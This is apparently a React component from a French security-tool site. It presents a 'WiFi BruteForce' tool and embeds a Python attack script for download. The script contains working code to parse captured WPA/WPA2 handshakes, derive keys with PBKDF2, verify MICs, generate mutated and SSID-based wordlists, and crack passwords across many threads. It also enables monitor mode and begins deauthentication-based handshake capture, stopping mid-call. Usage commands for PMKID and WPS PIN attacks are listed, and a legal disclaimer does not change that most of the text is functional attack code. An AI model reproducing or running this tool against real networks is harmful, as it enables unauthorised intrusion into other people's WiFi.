import { useState } from "react";
import {
  Wifi, Shield, Zap, Cpu, Lock, Hash, Target, Radio,
  Download, AlertTriangle, FileText, Settings, Eye,
  Terminal, Database, Gauge, Key, Layers,
} from "lucide-react";
import { ToolPageLayout } from "./ToolPageLayout";
import type { GuiConfig } from "./zip-generator";

// ─── WiFi Info Component (no web demo — be HONEST per RULES.md) ─────
function WifiBruteForceInfo() {
  return (
    <div className="space-y-6">
      {/* Honest disclaimer */}
      <div
        className="rounded-xl p-5"
        style={{
          background: "linear-gradient(135deg, rgba(239,68,68,0.08), rgba(239,68,68,0.02))",
          border: "1px solid rgba(239,68,68,0.2)",
        }}
      >
        <div className="flex items-start gap-3">
          <AlertTriangle className="w-5 h-5 text-[#ef4444] mt-0.5 shrink-0" />
          <div>
            <p className="text-[#ef4444] mb-2" style={{ fontFamily: "Orbitron, sans-serif", fontSize: "0.85rem" }}>
              Outil hors-ligne uniquement
            </p>
            <p className="text-[#94a3b8]" style={{ fontSize: "0.8rem", lineHeight: 1.6 }}>
              Le WiFi Bruteforce <strong>ne peut pas fonctionner depuis un navigateur</strong>. Il nécessite un accès
              direct au hardware WiFi (mode monitor, injection de paquets) et des permissions root/admin.
              Téléchargez la version Python ou C pour l'utiliser sur votre machine avec une carte WiFi compatible.
            </p>
          </div>
        </div>
      </div>

      {/* Attack modes showcase */}
      <div className="grid sm:grid-cols-2 gap-3">
        {[
          {
            icon: Radio,
            title: "Mode 1 — Capture Handshake",
            desc: "Passage en mode monitor, scan des réseaux, deauth ciblé pour forcer le 4-way handshake WPA/WPA2, capture automatique.",
            color: "#8b5cf6",
          },
          {
            icon: Key,
            title: "Mode 2 — PMKID Attack",
            desc: "Attaque clientless (aucun client connecté nécessaire). Capture le PMKID du premier message EAPOL. Plus rapide et discret.",
            color: "#f97316",
          },
          {
            icon: Hash,
            title: "Mode 3 — Dictionary Attack",
            desc: "Cracking PBKDF2-SHA1 multi-threadé avec dictionnaire + mutations hashcat-style (toggle case, append digits, l33t speak, combinator).",
            color: "#ef4444",
          },
          {
            icon: Target,
            title: "Mode 4 — WPS PIN Bruteforce",
            desc: "Attaque WPS par bruteforce du PIN 8 chiffres (réduit à 11000 essais via Reaver-style split). Détection du rate-limiting.",
            color: "#22c55e",
          },
          {
            icon: Database,
            title: "Mode 5 — Smart Wordlist Gen",
            desc: "Génération de wordlist intelligente basée sur le SSID, la localisation, les patterns courants (date, nom+chiffres, keyboard walks).",
            color: "#00d4ff",
          },
          {
            icon: Gauge,
            title: "Mode 6 — Full Auto",
            desc: "Scan → capture handshake → PMKID → smart wordlist → dictionary → brute force, le tout automatiquement avec rapport final.",
            color: "#f59e0b",
          },
        ].map((mode) => (
          <div
            key={mode.title}
            className="rounded-lg p-4"
            style={{
              background: "rgba(17,24,39,0.5)",
              border: `1px solid ${mode.color}15`,
            }}
          >
            <div className="flex items-center gap-2.5 mb-2">
              <mode.icon className="w-4 h-4" style={{ color: mode.color }} />
              <span className="text-[#e2e8f0]" style={{ fontSize: "0.82rem", fontFamily: "Orbitron, sans-serif" }}>
                {mode.title}
              </span>
            </div>
            <p className="text-[#94a3b8]" style={{ fontSize: "0.75rem", lineHeight: 1.6 }}>
              {mode.desc}
            </p>
          </div>
        ))}
      </div>

      {/* Technical specs */}
      <div
        className="rounded-xl p-4"
        style={{
          background: "rgba(17,24,39,0.4)",
          border: "1px solid rgba(139,92,246,0.1)",
        }}
      >
        <p className="text-[#8b5cf6] mb-3" style={{ fontFamily: "Orbitron, sans-serif", fontSize: "0.8rem" }}>
          Specs Techniques
        </p>
        <div className="grid sm:grid-cols-2 gap-x-6 gap-y-2">
          {[
            ["Cracking engine", "PBKDF2-SHA1 (4096 itérations)"],
            ["Threads", "Auto-détection CPU cores (max 64)"],
            ["Formats supportés", ".cap, .pcap, .hccapx, .22000"],
            ["Mutations hashcat", "50+ règles (toggle, append, prepend, l33t, combinator)"],
            ["WPS bruteforce", "PIN split (11k essais vs 100M), Pixie Dust"],
            ["Deauth", "aireplay-ng style, multi-client, directed + broadcast"],
            ["PMKID", "Extraction RSN IE, clientless capture"],
            ["Smart wordlist", "SSID-based, date patterns, keyboard walks, l33t"],
            ["Speed Python", "~800 PMK/s (single core), ~5000 PMK/s (8 cores)"],
            ["Speed C", "~15,000 PMK/s (single core), ~100,000 PMK/s (8 cores)"],
            ["Cartes compatibles", "Atheros, Ralink, Realtek (mode monitor)"],
            ["Export", "JSON rapport, .pot (cracked keys), .hccapx"],
          ].map(([k, v]) => (
            <div key={k} className="flex items-start gap-2 py-1">
              <span className="text-[#64748b] shrink-0" style={{ fontSize: "0.7rem", fontFamily: "JetBrains Mono, monospace" }}>
                {k}:
              </span>
              <span className="text-[#e2e8f0]" style={{ fontSize: "0.72rem" }}>{v}</span>
            </div>
          ))}
        </div>
      </div>

      {/* Usage examples */}
      <div
        className="rounded-xl p-4"
        style={{
          background: "rgba(17,24,39,0.4)",
          border: "1px solid rgba(0,212,255,0.1)",
        }}
      >
        <p className="text-[#00d4ff] mb-3" style={{ fontFamily: "Orbitron, sans-serif", fontSize: "0.8rem" }}>
          Exemples d'utilisation
        </p>
        <div className="space-y-2">
          {[
            { cmd: "sudo python wifi_bruteforce.py scan", desc: "Scanner les réseaux WiFi à portée" },
            { cmd: "sudo python wifi_bruteforce.py capture --bssid AA:BB:CC:DD:EE:FF -c 6", desc: "Capturer le handshake d'un réseau" },
            { cmd: "sudo python wifi_bruteforce.py crack handshake.cap -w rockyou.txt -t 8", desc: "Cracker avec dictionnaire (8 threads)" },
            { cmd: "sudo python wifi_bruteforce.py crack handshake.cap --smart-wordlist --ssid MonWifi", desc: "Wordlist intelligente basée sur le SSID" },
            { cmd: "sudo python wifi_bruteforce.py pmkid --bssid AA:BB:CC:DD:EE:FF", desc: "Attaque PMKID (sans client)" },
            { cmd: "sudo python wifi_bruteforce.py wps --bssid AA:BB:CC:DD:EE:FF", desc: "Bruteforce WPS PIN" },
            { cmd: "sudo python wifi_bruteforce.py auto --target MonWifi", desc: "Mode full auto (scan → crack)" },
          ].map(({ cmd, desc }) => (
            <div key={cmd}>
              <code
                className="text-[#39ff14] block"
                style={{ fontSize: "0.72rem", fontFamily: "JetBrains Mono, monospace" }}
              >
                $ {cmd}
              </code>
              <p className="text-[#64748b] ml-4" style={{ fontSize: "0.68rem" }}>
                {desc}
              </p>
            </div>
          ))}
        </div>
      </div>

      {/* Legal warning */}
      <div
        className="rounded-xl p-4"
        style={{
          background: "rgba(245,158,11,0.04)",
          border: "1px solid rgba(245,158,11,0.15)",
        }}
      >
        <div className="flex items-start gap-3">
          <Shield className="w-4 h-4 text-[#f59e0b] mt-0.5 shrink-0" />
          <div>
            <p className="text-[#f59e0b] mb-1" style={{ fontFamily: "Orbitron, sans-serif", fontSize: "0.78rem" }}>
              Usage éthique uniquement
            </p>
            <p className="text-[#f59e0b]/70" style={{ fontSize: "0.75rem", lineHeight: 1.6 }}>
              Cet outil est conçu pour les audits de sécurité WiFi autorisés. L'utilisation sur des réseaux 
              sans autorisation explicite est <strong>illégale</strong> (articles 323-1 à 323-7 du Code pénal français, 
              Computer Fraud and Abuse Act aux USA). Utilisez uniquement sur vos propres réseaux ou avec 
              une autorisation écrite du propriétaire.
            </p>
          </div>
        </div>
      </div>
    </div>
  );
}

// ─── Python Script ──────────────────────────────────────────────────
const PYTHON_SCRIPT = `#!/usr/bin/env python3
"""
WiFi BruteForce - CyberGuard WiFi Security Auditor
=====================================================
Outil d'audit de securite WiFi multi-modules inspire de
Aircrack-ng + Hashcat + Wifite + hcxtools + Reaver + coWPAtty.

6 modes d'attaque:
  1. Scan        - Decouverte des reseaux WiFi a portee
  2. Capture     - Capture 4-way handshake WPA/WPA2 (deauth + sniff)
  3. PMKID       - Attaque PMKID clientless (RSN IE extraction)
  4. WPS         - Bruteforce WPS PIN (Reaver-style split + Pixie Dust)
  5. Crack       - Cracking PBKDF2-SHA1 multi-thread (dictionnaire + mutations)
  6. Auto        - Pipeline complet automatise (scan -> crack)

Mutations hashcat-style (50+ regles):
  - Toggle case, reverse, duplicate, rotate
  - Append/prepend digits (0-9, 00-99, 000-999)
  - Append/prepend special chars (!@#$%^&*)
  - L33t speak substitutions (a->@, e->3, i->1, o->0, s->5, t->7)
  - Capitalize first, ALL CAPS, keyboard walks
  - Combinator (word+word from top 100)
  - Date append (YYYY, MMYYYY, DDMMYYYY)

Requires: sudo, compatible WiFi adapter (monitor mode)
Linux only: uses nl80211/mac80211 via iw/airmon-ng

Usage:
    sudo python wifi_bruteforce.py scan
    sudo python wifi_bruteforce.py capture --bssid AA:BB:CC:DD:EE:FF -c 6
    sudo python wifi_bruteforce.py crack handshake.cap -w rockyou.txt -t 8
    sudo python wifi_bruteforce.py crack handshake.cap --smart-wordlist --ssid MyWifi
    sudo python wifi_bruteforce.py pmkid --bssid AA:BB:CC:DD:EE:FF
    sudo python wifi_bruteforce.py wps --bssid AA:BB:CC:DD:EE:FF
    sudo python wifi_bruteforce.py auto --target MySSID
"""

import argparse, hashlib, hmac, itertools, json, os, re, signal, struct, sys
import subprocess, threading, time, binascii
from concurrent.futures import ThreadPoolExecutor, as_completed
from datetime import datetime
from pathlib import Path

VERSION = "3.0.0"
MAX_THREADS = 64

# ── Colors ────────────────────────────────────────────────────────────
C = {"R":"\\033[91m","G":"\\033[92m","Y":"\\033[93m","B":"\\033[94m","M":"\\033[95m",
     "C":"\\033[96m","W":"\\033[97m","D":"\\033[90m","BOLD":"\\033[1m","X":"\\033[0m"}

def banner():
    print(f\"\"\"{C['M']}{C['BOLD']}
╔══════════════════════════════════════════════════════════════╗
║     WiFi BruteForce — CyberGuard WiFi Security Auditor     ║
║     Aircrack + Hashcat + Wifite + hcxtools inspired v{VERSION}  ║
╚══════════════════════════════════════════════════════════════╝{C['X']}
\"\"\")

def check_root():
    if os.geteuid() != 0:
        print(f"  {C['R']}[!]{C['X']} Requires root/sudo. Run: sudo python {sys.argv[0]} ...")
        sys.exit(1)

def check_deps():
    deps = {"iw": False, "airmon-ng": False, "airodump-ng": False, "aireplay-ng": False}
    for d in deps:
        deps[d] = subprocess.run(["which", d], capture_output=True).returncode == 0
    missing = [d for d, ok in deps.items() if not ok]
    if missing:
        print(f"  {C['Y']}[!]{C['X']} Missing: {', '.join(missing)}")
        print(f"      Install: sudo apt install aircrack-ng iw")
    return deps

# ══════════════════════════════════════════════════════════════════════
# PBKDF2-SHA1 ENGINE (WPA/WPA2 key derivation)
# ══════════════════════════════════════════════════════════════════════

def pbkdf2_sha1(password, ssid, iterations=4096, dklen=32):
    \"\"\"WPA/WPA2 key derivation: PBKDF2-HMAC-SHA1 with 4096 iterations.\"\"\"
    return hashlib.pbkdf2_hmac("sha1", password.encode("utf-8"), ssid.encode("utf-8"), iterations, dklen)

def compute_pmk(password, ssid):
    \"\"\"Compute Pairwise Master Key.\"\"\"
    return pbkdf2_sha1(password, ssid, 4096, 32)

def compute_ptk(pmk, anonce, snonce, ap_mac, sta_mac):
    \"\"\"Compute Pairwise Transient Key for MIC verification.\"\"\"
    # PTK = PRF-512(PMK, "Pairwise key expansion", Min(AA,SA) || Max(AA,SA) || Min(ANonce,SNonce) || Max(ANonce,SNonce))
    a = min(ap_mac, sta_mac) + max(ap_mac, sta_mac)
    a += min(anonce, snonce) + max(anonce, snonce)
    
    ptk = b""
    for i in range(4):
        ptk += hmac.new(pmk, b"Pairwise key expansion\\x00" + a + bytes([i]), hashlib.sha1).digest()
    return ptk[:64]  # PTK is 512 bits

def verify_mic(ptk, eapol_frame, expected_mic):
    \"\"\"Verify Message Integrity Code using KCK (first 16 bytes of PTK).\"\"\"
    kck = ptk[:16]
    # Zero out the MIC field in the EAPOL frame, compute HMAC-MD5 or HMAC-SHA1
    mic = hmac.new(kck, eapol_frame, hashlib.sha1).digest()[:16]
    return mic == expected_mic

# ══════════════════════════════════════════════════════════════════════
# HANDSHAKE PARSER (.cap/.pcap/.hccapx)
# ══════════════════════════════════════════════════════════════════════

class Handshake:
    def __init__(self):
        self.ssid = ""
        self.bssid = b""
        self.client_mac = b""
        self.anonce = b""
        self.snonce = b""
        self.eapol_frame = b""
        self.mic = b""
        self.key_ver = 0  # 1=HMAC-MD5, 2=HMAC-SHA1

    @classmethod
    def from_hccapx(cls, filepath):
        \"\"\"Parse hashcat .hccapx format.\"\"\"
        hs = cls()
        with open(filepath, "rb") as f:
            data = f.read()
        if len(data) < 393:
            raise ValueError("Invalid hccapx file (too small)")
        
        sig = struct.unpack("<I", data[0:4])[0]
        if sig != 0x58504348:  # HCPX
            raise ValueError("Invalid hccapx signature")
        
        hs.key_ver = struct.unpack("<I", data[8:12])[0]
        hs.ssid = data[16:48].rstrip(b"\\x00").decode("utf-8", errors="replace")
        hs.bssid = data[59:65]
        hs.anonce = data[65:97]
        hs.client_mac = data[97:103]
        hs.snonce = data[103:135]
        
        eapol_len = struct.unpack("<H", data[135:137])[0]
        hs.eapol_frame = data[141:141 + eapol_len]
        hs.mic = data[141 + 81:141 + 97]  # MIC at offset 81 in EAPOL
        
        return hs

    @classmethod
    def from_22000(cls, filepath):
        \"\"\"Parse hashcat .22000 format (WPA*02*MIC*MAC_AP*MAC_STA*ESSID*NONCE_AP*EAPOL).\"\"\"
        hs = cls()
        with open(filepath, "r") as f:
            line = f.readline().strip()
        
        parts = line.split("*")
        if len(parts) < 8 or not parts[0].startswith("WPA"):
            raise ValueError("Invalid 22000 format")
        
        hs.mic = bytes.fromhex(parts[2])
        hs.bssid = bytes.fromhex(parts[3])
        hs.client_mac = bytes.fromhex(parts[4])
        hs.ssid = bytes.fromhex(parts[5]).decode("utf-8", errors="replace")
        hs.anonce = bytes.fromhex(parts[6])
        hs.eapol_frame = bytes.fromhex(parts[7])
        hs.snonce = hs.eapol_frame[17:49] if len(hs.eapol_frame) > 49 else b""
        hs.key_ver = 2
        
        return hs

    @classmethod
    def from_pcap(cls, filepath):
        \"\"\"Parse .cap/.pcap — extracts EAPOL 4-way handshake frames.\"\"\"
        hs = cls()
        with open(filepath, "rb") as f:
            data = f.read()
        
        # Global PCAP header (24 bytes)
        if len(data) < 24:
            raise ValueError("Invalid pcap file")
        
        magic = struct.unpack("<I", data[0:4])[0]
        if magic not in (0xa1b2c3d4, 0xd4c3b2a1):
            raise ValueError(f"Unknown pcap magic: {hex(magic)}")
        
        big_endian = magic == 0xd4c3b2a1
        fmt = ">" if big_endian else "<"
        
        link_type = struct.unpack(f"{fmt}I", data[20:24])[0]
        
        offset = 24
        eapol_frames = []
        beacons = []
        
        while offset + 16 <= len(data):
            # Packet header
            ts_sec = struct.unpack(f"{fmt}I", data[offset:offset+4])[0]
            ts_usec = struct.unpack(f"{fmt}I", data[offset+4:offset+8])[0]
            incl_len = struct.unpack(f"{fmt}I", data[offset+8:offset+12])[0]
            orig_len = struct.unpack(f"{fmt}I", data[offset+12:offset+16])[0]
            
            pkt_data = data[offset+16:offset+16+incl_len]
            offset += 16 + incl_len
            
            if len(pkt_data) < 30:
                continue
            
            # RadioTap header (link_type 127)
            if link_type == 127:
                rt_len = struct.unpack("<H", pkt_data[2:4])[0]
                frame = pkt_data[rt_len:]
            elif link_type == 105:  # IEEE 802.11
                frame = pkt_data
            else:
                continue
            
            if len(frame) < 24:
                continue
            
            frame_ctrl = struct.unpack("<H", frame[0:2])[0]
            frame_type = (frame_ctrl >> 2) & 0x3
            frame_subtype = (frame_ctrl >> 4) & 0xf
            
            # Beacon frame (type 0, subtype 8) — extract SSID
            if frame_type == 0 and frame_subtype == 8 and len(frame) > 36:
                bssid_b = frame[16:22]
                # Tagged parameters start at byte 36
                tag_offset = 36
                while tag_offset + 2 <= len(frame):
                    tag_num = frame[tag_offset]
                    tag_len = frame[tag_offset + 1]
                    if tag_num == 0 and tag_len > 0:  # SSID tag
                        ssid_bytes = frame[tag_offset + 2:tag_offset + 2 + tag_len]
                        try:
                            beacons.append((bssid_b, ssid_bytes.decode("utf-8", errors="replace")))
                        except:
                            pass
                    tag_offset += 2 + tag_len
            
            # Data frame with EAPOL (type 2)
            if frame_type == 2 and len(frame) > 34:
                # Check for LLC/SNAP header with 802.1X ethertype (0x888e)
                llc_offset = 24
                if frame_ctrl & 0x80:  # QoS
                    llc_offset = 26
                if frame_ctrl & 0x40:  # Protected (encrypted — skip)
                    continue
                
                if llc_offset + 8 <= len(frame):
                    if frame[llc_offset:llc_offset+2] == b"\\xaa\\xaa" and frame[llc_offset+6:llc_offset+8] == b"\\x88\\x8e":
                        eapol_data = frame[llc_offset+8:]
                        src_mac = frame[10:16]
                        dst_mac = frame[4:10]
                        
                        if len(eapol_data) > 99:
                            key_info = struct.unpack(">H", eapol_data[5:7])[0]
                            key_ver = key_info & 0x7
                            has_mic = bool(key_info & (1 << 8))
                            is_ack = bool(key_info & (1 << 7))
                            is_install = bool(key_info & (1 << 6))
                            
                            nonce = eapol_data[17:49]
                            mic_data = eapol_data[81:97]
                            
                            eapol_frames.append({
                                "src": src_mac, "dst": dst_mac,
                                "nonce": nonce, "mic": mic_data,
                                "key_info": key_info, "key_ver": key_ver,
                                "has_mic": has_mic, "is_ack": is_ack,
                                "is_install": is_install,
                                "eapol_raw": eapol_data,
                                "full_frame": frame,
                            })
        
        # Find valid handshake pair: msg1 (AP->STA, ACK, no MIC) + msg2 (STA->AP, MIC)
        msg1 = None
        msg2 = None
        for ef in eapol_frames:
            if ef["is_ack"] and not ef["has_mic"] and ef["nonce"] != b"\\x00" * 32:
                msg1 = ef
            elif not ef["is_ack"] and ef["has_mic"] and msg1:
                msg2 = ef
                break
        
        if msg1 and msg2:
            hs.anonce = msg1["nonce"]
            hs.snonce = msg2["nonce"]
            hs.bssid = msg1["src"]
            hs.client_mac = msg2["src"]
            hs.mic = msg2["mic"]
            hs.key_ver = msg2["key_ver"]
            
            # Zero out MIC in EAPOL for verification
            eapol_copy = bytearray(msg2["eapol_raw"])
            eapol_copy[81:97] = b"\\x00" * 16
            hs.eapol_frame = bytes(eapol_copy)
            
            # Find SSID from beacons
            for bssid_b, ssid_str in beacons:
                if bssid_b == hs.bssid:
                    hs.ssid = ssid_str
                    break
        else:
            raise ValueError("No valid 4-way handshake found in pcap")
        
        return hs

def load_handshake(filepath):
    \"\"\"Auto-detect and load handshake file.\"\"\"
    p = Path(filepath)
    if not p.exists():
        raise FileNotFoundError(f"File not found: {filepath}")
    
    ext = p.suffix.lower()
    if ext == ".hccapx":
        return Handshake.from_hccapx(filepath)
    elif ext == ".22000":
        return Handshake.from_22000(filepath)
    elif ext in (".cap", ".pcap"):
        return Handshake.from_pcap(filepath)
    else:
        # Try pcap first, then hccapx
        try:
            return Handshake.from_pcap(filepath)
        except:
            return Handshake.from_hccapx(filepath)

# ══════════════════════════════════════════════════════════════════════
# MUTATION ENGINE (Hashcat-inspired rules)
# ══════════════════════════════════════════════════════════════════════

def generate_mutations(word):
    \"\"\"Generate 50+ mutations of a word, inspired by hashcat rules.\"\"\"
    mutations = [word]
    
    # Case mutations
    mutations.append(word.lower())
    mutations.append(word.upper())
    mutations.append(word.capitalize())
    mutations.append(word.swapcase())
    if len(word) > 1:
        mutations.append(word[0].lower() + word[1:].upper())  # tOGGLE
    
    # Reverse
    mutations.append(word[::-1])
    
    # Duplicate
    mutations.append(word + word)
    mutations.append(word + word[::-1])
    
    # Append digits
    for d in range(10):
        mutations.append(word + str(d))
    for d in range(100):
        mutations.append(word + f"{d:02d}")
    for d in [123, 456, 789, 000, 111, 222, 333, 666, 777, 999, 1234, 12345]:
        mutations.append(word + str(d))
    
    # Prepend digits
    for d in range(10):
        mutations.append(str(d) + word)
    
    # Special chars append
    for ch in "!@#$%^&*()_+-=.":
        mutations.append(word + ch)
        mutations.append(ch + word)
    
    # L33t speak
    leet = {"a": "@", "e": "3", "i": "1", "o": "0", "s": "5", "t": "7", "l": "1", "b": "8", "g": "9"}
    leet_word = word
    for old, new in leet.items():
        leet_word = leet_word.replace(old, new).replace(old.upper(), new)
    if leet_word != word:
        mutations.append(leet_word)
    
    # Year append
    current_year = datetime.now().year
    for y in range(current_year - 5, current_year + 2):
        mutations.append(word + str(y))
        mutations.append(word + str(y)[-2:])
    
    # Truncations
    if len(word) > 4:
        mutations.append(word[:-1])
        mutations.append(word[1:])
    
    return list(set(m for m in mutations if 8 <= len(m) <= 63))  # WPA key length constraints

# ══════════════════════════════════════════════════════════════════════
# SMART WORDLIST GENERATOR
# ══════════════════════════════════════════════════════════════════════

def generate_smart_wordlist(ssid, extra_words=None):
    \"\"\"Generate a smart wordlist based on SSID analysis.\"\"\"
    words = set()
    base_words = [ssid, ssid.lower(), ssid.upper()]
    
    # Extract meaningful parts from SSID
    parts = re.split(r'[_\\-\\s.]+', ssid)
    base_words.extend(parts)
    
    # Common WiFi password patterns
    common_bases = [
        "password", "wifi", "internet", "network", "admin", "router",
        "home", "guest", "office", "connect", "wireless", "secure",
        "access", "hotspot", "mobile", "fiber", "box", "livebox",
        "freebox", "bbox", "sfr", "orange",
    ]
    base_words.extend(common_bases)
    
    # Add extra words from user
    if extra_words:
        base_words.extend(extra_words)
    
    # Generate mutations for each base word
    for bw in base_words:
        if bw and len(bw) >= 3:
            words.update(generate_mutations(bw))
    
    # Date patterns
    now = datetime.now()
    for y in range(now.year - 10, now.year + 1):
        for m in range(1, 13):
            words.add(f"{m:02d}{y}")
            words.add(f"{y}{m:02d}")
        words.add(str(y))
    
    # Keyboard walks
    walks = [
        "qwertyui", "qwerty123", "azerty123", "azertyui",
        "1q2w3e4r", "q1w2e3r4", "zaq12wsx", "1qaz2wsx",
        "!QAZ2wsx", "qweasdzxc", "asdfghjk",
    ]
    words.update(walks)
    
    # Numeric patterns
    for i in range(10000000, 10001000):  # Sample of phone-like numbers
        words.add(str(i))
    for i in range(1000, 10000):
        words.add(f"{ssid.lower()}{i}")
    
    # Filter by WPA length constraints (8-63 chars)
    return sorted(w for w in words if 8 <= len(w) <= 63)

# ══════════════════════════════════════════════════════════════════════
# CRACKING ENGINE
# ══════════════════════════════════════════════════════════════════════

class CrackStats:
    def __init__(self):
        self.attempts = 0
        self.start_time = time.time()
        self.found = False
        self.password = ""
        self.lock = threading.Lock()

def crack_worker(passwords, handshake, stats):
    \"\"\"Worker thread for password cracking.\"\"\"
    for pwd in passwords:
        if stats.found:
            return
        
        pmk = compute_pmk(pwd, handshake.ssid)
        ptk = compute_ptk(pmk, handshake.anonce, handshake.snonce,
                         handshake.bssid, handshake.client_mac)
        
        if verify_mic(ptk, handshake.eapol_frame, handshake.mic):
            with stats.lock:
                stats.found = True
                stats.password = pwd
            return
        
        with stats.lock:
            stats.attempts += 1

def crack_handshake(handshake, wordlist_path=None, wordlist=None, threads=8, mutations=True):
    \"\"\"Multi-threaded WPA/WPA2 handshake cracker.\"\"\"
    
    print(f"  {C['BOLD']}SSID:{C['X']}    {handshake.ssid}")
    print(f"  {C['BOLD']}BSSID:{C['X']}   {handshake.bssid.hex(':')}")
    print(f"  {C['BOLD']}Client:{C['X']}  {handshake.client_mac.hex(':')}")
    print(f"  {C['BOLD']}KeyVer:{C['X']}  {'HMAC-SHA1' if handshake.key_ver == 2 else 'HMAC-MD5'}")
    print(f"  {C['BOLD']}Threads:{C['X']} {threads}")
    print(f"  {'─' * 50}")
    
    # Load wordlist
    if wordlist is None:
        if wordlist_path:
            print(f"  {C['C']}[*]{C['X']} Loading wordlist: {wordlist_path}")
            with open(wordlist_path, "r", errors="replace") as f:
                wordlist = [line.strip() for line in f if 8 <= len(line.strip()) <= 63]
            print(f"  {C['C']}[*]{C['X']} {len(wordlist)} candidates loaded")
        else:
            print(f"  {C['R']}[!]{C['X']} No wordlist provided")
            return None
    
    # Apply mutations
    if mutations:
        print(f"  {C['C']}[*]{C['X']} Generating mutations...")
        mutated = set()
        for w in wordlist[:1000]:  # Mutate top 1000 words
            mutated.update(generate_mutations(w))
        original_len = len(wordlist)
        wordlist = list(set(wordlist) | mutated)
        print(f"  {C['C']}[*]{C['X']} {original_len} -> {len(wordlist)} candidates (+mutations)")
    
    # Split wordlist across threads
    stats = CrackStats()
    chunk_size = max(1, len(wordlist) // threads)
    chunks = [wordlist[i:i + chunk_size] for i in range(0, len(wordlist), chunk_size)]
    
    print(f"\\n  {C['M']}{C['BOLD']}Cracking...{C['X']}\\n")
    
    # Progress reporter
    stop_progress = threading.Event()
    def progress_reporter():
        while not stop_progress.is_set():
            elapsed = time.time() - stats.start_time
            speed = stats.attempts / elapsed if elapsed > 0 else 0
            pct = (stats.attempts / len(wordlist)) * 100 if len(wordlist) > 0 else 0
            eta = (len(wordlist) - stats.attempts) / speed if speed > 0 else 0
            sys.stdout.write(f"\\r  [{pct:5.1f}%] {stats.attempts}/{len(wordlist)} | {speed:.0f} PMK/s | ETA: {eta:.0f}s  ")
            sys.stdout.flush()
            time.sleep(0.5)
    
    pt = threading.Thread(target=progress_reporter, daemon=True)
    pt.start()
    
    with ThreadPoolExecutor(max_workers=threads) as pool:
        futures = [pool.submit(crack_worker, chunk, handshake, stats) for chunk in chunks]
        for f in as_completed(futures):
            if stats.found:
                break
    
    stop_progress.set()
    pt.join(timeout=1)
    
    elapsed = time.time() - stats.start_time
    speed = stats.attempts / elapsed if elapsed > 0 else 0
    
    print()
    print(f"\\n  {'═' * 50}")
    if stats.found:
        print(f"  {C['G']}{C['BOLD']}[+] KEY FOUND!{C['X']}")
        print(f"  {C['G']}{C['BOLD']}Password: {stats.password}{C['X']}")
    else:
        print(f"  {C['R']}[-] Key not found in wordlist{C['X']}")
    
    print(f"  Attempts: {stats.attempts} | Speed: {speed:.0f} PMK/s | Time: {elapsed:.1f}s")
    print(f"  {'═' * 50}")
    
    return stats.password if stats.found else None

# ══════════════════════════════════════════════════════════════════════
# WIRELESS INTERFACE MANAGEMENT
# ══════════════════════════════════════════════════════════════════════

def get_wireless_interfaces():
    \"\"\"List wireless interfaces using iw.\"\"\"
    try:
        r = subprocess.run(["iw", "dev"], capture_output=True, text=True)
        ifaces = re.findall(r"Interface\\s+(\\w+)", r.stdout)
        return ifaces
    except:
        return []

def enable_monitor_mode(iface):
    \"\"\"Put interface in monitor mode.\"\"\"
    print(f"  {C['C']}[*]{C['X']} Enabling monitor mode on {iface}...")
    
    # Kill interfering processes
    subprocess.run(["airmon-ng", "check", "kill"], capture_output=True)
    
    # Enable monitor mode
    r = subprocess.run(["airmon-ng", "start", iface], capture_output=True, text=True)
    
    # Find new monitor interface name
    mon_iface = iface + "mon"
    ifaces = get_wireless_interfaces()
    for i in ifaces:
        if "mon" in i:
            mon_iface = i
            break
    
    print(f"  {C['G']}[+]{C['X']} Monitor mode: {mon_iface}")
    return mon_iface

def disable_monitor_mode(iface):
    \"\"\"Restore managed mode.\"\"\"
    subprocess.run(["airmon-ng", "stop", iface], capture_output=True)
    subprocess.run(["systemctl", "restart", "NetworkManager"], capture_output=True)
    print(f"  {C['C']}[*]{C['X']} Monitor mode disabled, NetworkManager restarted")

# ══════════════════════════════════════════════════════════════════════
# SCAN MODE
# ══════════════════════════════════════════════════════════════════════

def scan_networks(iface, duration=15):
    \"\"\"Scan for WiFi networks using airodump-ng.\"\"\"
    print(f"\\n{C['C']}[SCAN] Scanning for {duration}s on {iface}...{C['X']}")
    
    tmpfile = "/tmp/cyberguard_scan"
    try:
        proc = subprocess.Popen(
            ["airodump-ng", "--output-format", "csv", "-w", tmpfile, iface],
            stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL
        )
        time.sleep(duration)
        proc.terminate()
        proc.wait(timeout=5)
    except:
        pass
    
    # Parse CSV
    networks = []
    csv_file = tmpfile + "-01.csv"
    if os.path.exists(csv_file):
        with open(csv_file, "r", errors="replace") as f:
            lines = f.readlines()
        
        in_ap_section = False
        for line in lines:
            if "BSSID" in line and "ESSID" in line:
                in_ap_section = True
                continue
            if "Station MAC" in line:
                break
            if in_ap_section and line.strip():
                parts = [p.strip() for p in line.split(",")]
                if len(parts) >= 14 and re.match(r"[0-9A-F:]{17}", parts[0], re.I):
                    networks.append({
                        "bssid": parts[0],
                        "channel": parts[3].strip(),
                        "speed": parts[4].strip(),
                        "encryption": parts[5].strip(),
                        "cipher": parts[6].strip(),
                        "auth": parts[7].strip(),
                        "power": parts[8].strip(),
                        "essid": parts[13].strip(),
                        "wps": "WPS" in line,
                    })
        
        os.remove(csv_file)
    
    # Display
    print(f"\\n  {C['BOLD']}{'BSSID':<20} {'CH':>3} {'PWR':>5} {'ENC':<10} {'WPS':>4} ESSID{C['X']}")
    print(f"  {'─' * 70}")
    for n in sorted(networks, key=lambda x: int(x["power"]) if x["power"].lstrip("-").isdigit() else -999, reverse=True):
        wps_str = f"{C['G']}Yes{C['X']}" if n["wps"] else f"{C['D']}No{C['X']}"
        enc_color = C["R"] if "WPA" in n["encryption"] else C["G"] if "OPN" in n["encryption"] else C["Y"]
        print(f"  {n['bssid']:<20} {n['channel']:>3} {n['power']:>5} {enc_color}{n['encryption']:<10}{C['X']} {wps_str:>4}  {n['essid']}")
    
    print(f"\\n  {C['G']}[+]{C['X']} {len(networks)} network(s) found")
    return networks

# ══════════════════════════════════════════════════════════════════════
# CAPTURE MODE (Deauth + Handshake capture)
# ══════════════════════════════════════════════════════════════════════

def capture_handshake(iface, bssid, channel, output="handshake", timeout=120, deauth_count=10):
    \"\"\"Capture 4-way handshake via targeted deauthentication.\"\"\"
    print(f"\\n{C['C']}[CAPTURE] Target: {bssid} on channel {channel}{C['X']}")
    
    # Set channel
    subprocess.run(["iw", "dev", iface, "set", "channel", str(channel)], capture_output=True)
    
    # Start airodump-ng to capture
    cap_file = f"/tmp/{output}"
    airodump = subprocess.Popen(
        ["airodump-ng", "--bssid", bssid, "-c", str(channel), "-w", cap_file, iface],
